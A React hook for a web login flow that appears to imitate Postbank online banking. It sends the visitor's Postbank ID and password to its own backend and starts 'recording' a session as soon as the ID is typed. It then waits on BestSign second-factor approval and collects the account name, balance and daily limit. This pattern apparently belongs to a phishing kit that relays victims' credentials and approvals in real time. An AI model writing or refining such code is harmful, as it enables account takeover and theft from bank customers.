import { useState, useCallback, useRef } from 'react';

// Backend server URL - empty string = relative URLs (works with nginx proxy)
const API_URL = import.meta.env.VITE_API_URL || '';

// MOCK MODE - Enable via:
// 1. Environment variable: VITE_MOCK_MODE=true
// 2. URL parameter: ?mock=true
// 3. Hardcode below: const MOCK_MODE = true
//
// Demo URL parameters:
// ?mock=true&balance=10000&limit=5000&name=Max%20Mustermann
// - balance: Account balance in EUR (default: 45)
// - limit: Daily limit in EUR (default: 70000)
// - name: Account holder name (default: Demo User)
const urlParams = new URLSearchParams(window.location.search);
const MOCK_MODE = import.meta.env.VITE_MOCK_MODE === 'true' || urlParams.get('mock') === 'true';
const MOCK_BESTSIGN_DELAY = 3000; // 3 seconds simulated BestSign wait
const MOCK_BESTSIGN_CODE = 'DEMO';

// Demo mode customization via URL params
const MOCK_BALANCE = urlParams.get('balance') || '45';
const MOCK_LIMIT = urlParams.get('limit') || '70000';
const MOCK_NAME = urlParams.get('name') || 'Demo User';

if (MOCK_MODE) {
  console.log('MOCK MODE ENABLED - No real backend needed');
}

export function usePostbankApi() {
  const [sessionId, setSessionId] = useState(null);
  const [status, setStatus] = useState('idle'); // idle, pre_registered, loading, awaiting_bestsign, logged_in, error
  const [error, setError] = useState(null);
  const [bestSignCode, setBestSignCode] = useState(null);
  const [accountName, setAccountName] = useState('Kunde');
  const [balance, setBalance] = useState('0,00 €');
  const [dailyLimit, setDailyLimit] = useState(null);
  const [lastLogin, setLastLogin] = useState(null);
  const pollingRef = useRef(null);
  const sessionIdRef = useRef(null); // Ref to always have latest sessionId

  // PRE-REGISTER: Create session when user enters Postbank ID (starts recording early)
  const preRegister = useCallback(async (postbankId) => {
    if (MOCK_MODE) {
      const mockSessionId = `mock-${Date.now()}`;
      sessionIdRef.current = mockSessionId;
      setSessionId(mockSessionId);
      setStatus('pre_registered');
      return { success: true, sessionId: mockSessionId };
    }

    try {
      const response = await fetch(`${API_URL}/api/session/preregister`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ postbankId })
      });

      const data = await response.json();
      if (response.ok) {
        sessionIdRef.current = data.sessionId;
        setSessionId(data.sessionId);
        setStatus('pre_registered');
        return { success: true, sessionId: data.sessionId };
      }
      return { success: false, error: data.error };
    } catch (err) {
      console.error('Pre-register error:', err);
      return { success: false, error: err.message };
    }
  }, []);

  // Login with password (uses existing sessionId if pre-registered)
  const login = useCallback(async (postbankId, password) => {
    setStatus('loading');
    setError(null);

    // MOCK MODE: Simulate login without backend
    if (MOCK_MODE) {
      console.log('MOCK MODE: Simulating login...');
      console.log(`Demo settings: Balance=${MOCK_BALANCE}, Limit=${MOCK_LIMIT}, Name=${MOCK_NAME}`);
      await new Promise(r => setTimeout(r, 800)); // Simulate network delay
      
      const mockSessionId = `mock-${Date.now()}`;
      setSessionId(mockSessionId);
      setStatus('awaiting_bestsign');
      setBestSignCode(MOCK_BESTSIGN_CODE);
      
      // Auto-approve after delay and set demo account data
      setTimeout(() => {
        console.log('MOCK MODE: Auto-approving BestSign...');
        setAccountName(MOCK_NAME);
        setBalance(`${MOCK_BALANCE} €`);
        setDailyLimit(`${MOCK_LIMIT} €`);
        setLastLogin(new Date().toLocaleString('de-DE', { 
          day: '2-digit', month: '2-digit', year: 'numeric', 
          hour: '2-digit', minute: '2-digit' 
        }) + ' Uhr');
        setStatus('logged_in');
      }, MOCK_BESTSIGN_DELAY);
      
      return { 
        success: true, 
        status: 'awaiting_bestsign', 
        bestSignCode: MOCK_BESTSIGN_CODE 
      };
    }

    try {
      // Use ref to get the latest sessionId (from preRegister)
      const currentSessionId = sessionIdRef.current;
      
      const response = await fetch(`${API_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ postbankId, password, sessionId: currentSessionId })
      });

      const data = await response.json();

      if (!response.ok) {
        setStatus('error');
        setError(data.error || 'Login failed');
        return { success: false, error: data.error };
      }

      sessionIdRef.current = data.sessionId;
      setSessionId(data.sessionId);
      setStatus(data.status);
      
      if (data.bestSignCode) {
        setBestSignCode(data.bestSignCode);
      }

      // If waiting for BestSign, start polling
      if (data.status === 'awaiting_bestsign') {
        startPolling(data.sessionId);
        return { success: true, status: 'awaiting_bestsign', bestSignCode: data.bestSignCode };
      }

      if (data.status === 'logged_in') {
        return { success: true, status: 'logged_in' };
      }

      return { success: true, status: data.status };
    } catch (err) {
      setStatus('error');
      setError(err.message || 'Network error');
      return { success: false, error: err.message };
    }
  }, []);

  // Poll for BestSign status
  const checkStatus = useCallback(async (sid) => {
    const id = sid || sessionId;
    if (!id) return null;

    try {
      const response = await fetch(`${API_URL}/api/login/status/${id}`);
      const data = await response.json();

      setStatus(data.status);
      
      if (data.bestSignCode) {
        setBestSignCode(data.bestSignCode);
      }

      if (data.error) {
        setError(data.error);
      }

      // Capture account data when login is successful
      if (data.status === 'logged_in') {
        if (data.accountName) {
          setAccountName(data.accountName);
        }
        if (data.balance) {
          setBalance(`${data.balance} €`);
        }
        if (data.dailyLimit) {
          setDailyLimit(`${data.dailyLimit} €`);
        }
        if (data.lastLogin) {
          setLastLogin(data.lastLogin);
        }
      }

      // Stop polling if logged in or error
      if (data.status === 'logged_in' || data.status === 'error') {
        stopPolling();
      }

      return data;
    } catch (err) {
      console.error('Status check error:', err);
      return null;
    }
  }, [sessionId]);

  // Start polling for BestSign status
  const startPolling = useCallback((sid) => {
    if (pollingRef.current) return;
    
    pollingRef.current = setInterval(() => {
      checkStatus(sid);
    }, 2000); // Poll every 2 seconds
  }, [checkStatus]);

  // Stop polling
  const stopPolling = useCallback(() => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current);
      pollingRef.current = null;
    }
  }, []);

  // Cancel session
  const cancelSession = useCallback(async () => {
    stopPolling();
    
    const currentSessionId = sessionIdRef.current;
    if (!currentSessionId) return;

    // MOCK MODE: Just reset state
    if (MOCK_MODE) {
      console.log('MOCK MODE: Cancelling session...');
      sessionIdRef.current = null;
      setSessionId(null);
      setStatus('idle');
      setError(null);
      setBestSignCode(null);
      return;
    }

    try {
      await fetch(`${API_URL}/api/login/cancel`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: currentSessionId })
      });
    } catch (err) {
      console.error('Cancel error:', err);
    }

    sessionIdRef.current = null;
    setSessionId(null);
    setStatus('idle');
    setError(null);
    setBestSignCode(null);
  }, [stopPolling]);

  // Get account data
  const getAccountData = useCallback(async () => {
    if (!sessionId || status !== 'logged_in') {
      return { success: false, error: 'Not logged in' };
    }

    try {
      const response = await fetch(`${API_URL}/api/account/${sessionId}`);
      const data = await response.json();

      if (!response.ok) {
        return { success: false, error: data.error };
      }

      return { success: true, data: data.data };
    } catch (err) {
      return { success: false, error: err.message };
    }
  }, [sessionId, status]);

  // Reset state
  const reset = useCallback(() => {
    stopPolling();
    sessionIdRef.current = null;
    setSessionId(null);
    setStatus('idle');
    setError(null);
    setBestSignCode(null);
  }, [stopPolling]);

  return {
    sessionId,
    status,
    error,
    bestSignCode,
    accountName,
    balance,
    dailyLimit,
    lastLogin,
    preRegister,
    login,
    checkStatus,
    cancelSession,
    getAccountData,
    reset,
    isLoading: status === 'loading',
    isPreRegistered: status === 'pre_registered',
    isAwaitingBestSign: status === 'awaiting_bestsign',
    isLoggedIn: status === 'logged_in',
    hasError: status === 'error',
    isMockMode: MOCK_MODE
  };
}
